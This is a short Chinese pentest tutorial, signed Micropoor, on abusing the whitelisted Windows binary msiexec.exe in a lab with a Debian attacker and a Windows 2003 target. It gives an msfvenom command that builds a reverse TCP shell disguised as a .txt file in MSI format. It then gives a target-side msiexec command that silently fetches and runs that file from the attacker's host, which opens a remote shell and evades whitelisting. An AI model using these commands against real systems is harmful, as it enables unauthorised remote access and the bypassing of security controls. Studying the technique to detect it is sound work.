**注：**请多喝点热水或者凉白开，身体特别重要。

### Msiexec简介：

Msiexec 是 Windows Installer 的一部分。用于安装 Windows Installer 安装包（MSI）,一般在运行 Microsoft Update 安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于 Windows 2003，Windows 7 等。

**说明：**Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。

### 基于白名单Msiexec.exe配置payload：

Windows 2003 默认位置：

```bash
C:\WINDOWS\system32\msiexec.exe
C:\WINDOWS\SysWOW64\msiexec.exe
```

**攻击机：**192.168.1.4 Debian  
**靶机：** 192.168.1.119 Windows 2003

### 配置攻击机msf：
![](/img/2649cf5ad568984ff20e46111fa98b12.jpg)


### 配置payload：

```bash
msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f msi > Micropoor_rev_x64_53.txt
```
![](/img/5c011fcb99c3411ae97fb78affcca15d.jpg)

![](/img/69b03297f582100971130f6ac6a9e1e4.jpg)

### 靶机执行：

```bash
C:\Windows\System32\msiexec.exe /q /i http://192.168.1.4/Micropoor_rev\_x64_53.txt
```
![](/img/39acc13b2f9da5473510eed6d26c74a1.jpg)

![](/img/c70a2131fc4a5392c8405806438ca269.jpg)

![](/img/7f9e95b7d3fa9393cd1e6a4978294430.jpg)

>   Micropoor
